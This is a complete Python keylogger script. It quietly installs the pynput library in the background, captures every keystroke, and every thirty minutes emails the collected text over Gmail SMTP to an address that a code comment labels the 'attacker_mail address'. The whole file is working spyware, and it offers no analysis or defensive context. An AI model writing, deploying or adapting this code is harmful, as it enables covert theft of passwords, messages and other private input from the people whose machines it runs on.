import threading
import smtplib
import subprocess
from pynput import keyboard

def install_pynput():
    subprocess.Popen(
        ["pip", "install", "pynput"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )

install_thread = threading.Thread(target=install_pynput, daemon=True)
install_thread.start()

string_empty = ""

def on_press(key):
    global string_empty
    try:
        string_empty += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            string_empty += " "
        else:
            string_empty += " " + str(key) + " "

def report():
    global string_empty
    data = string_empty
    string_empty = ""
    send_mail("mail_address", "app_password", data) # enter the attacker_mail address, enter the app_password from mail_security
    timer = threading.Timer(1800, report)
    timer.start()

def send_mail(email, password, data):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, data)
    server.quit()

with keyboard.Listener(on_press=on_press) as listener:
    report()
    listener.join()
